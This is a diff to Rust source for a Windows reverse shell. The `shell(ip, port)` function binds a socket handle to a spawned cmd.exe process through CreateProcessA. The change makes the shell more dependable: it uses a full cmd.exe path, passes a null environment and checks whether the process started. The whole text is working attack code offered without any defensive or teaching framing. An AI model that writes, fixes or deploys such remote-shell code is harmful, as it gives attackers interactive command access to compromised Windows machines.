@@ -80,23 +80,25 @@ pub fn shell(ip: &str, port: u16) {
     startup_info.hStdError = unsafe { *sock_handle };
     let lp_application_name: PSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
-    lp_command_line.0 = CString::new("cmd.exe").unwrap().into_raw() as *mut u8;
+    lp_command_line.0 = CString::new("C:\\Windows\\System32\\cmd.exe").unwrap().into_raw() as *mut u8;
     let lp_process_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
     let lp_thread_attributes: SECURITY_ATTRIBUTES = unsafe { mem::zeroed() };
     let dw_creation_flags: PROCESS_CREATION_FLAGS = unsafe { mem::zeroed() };
-    let lp_environment: c_void = unsafe { mem::zeroed() };
     let lp_current_directory: PSTR = unsafe { mem::zeroed() };
     let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };
-    unsafe {
+    let create_res = unsafe {
         CreateProcessA(lp_application_name,
                        lp_command_line,
                        &lp_process_attributes,
                        &lp_thread_attributes,
                        true,
                        dw_creation_flags,
-                       &lp_environment,
+                       ptr::null(),
                        lp_current_directory,
                        &startup_info,
-                       &mut process_information);
+                       &mut process_information)
+    };
+    if !create_res.as_bool() {
+        panic!("Could not start cmd.exe process");
     }
 }
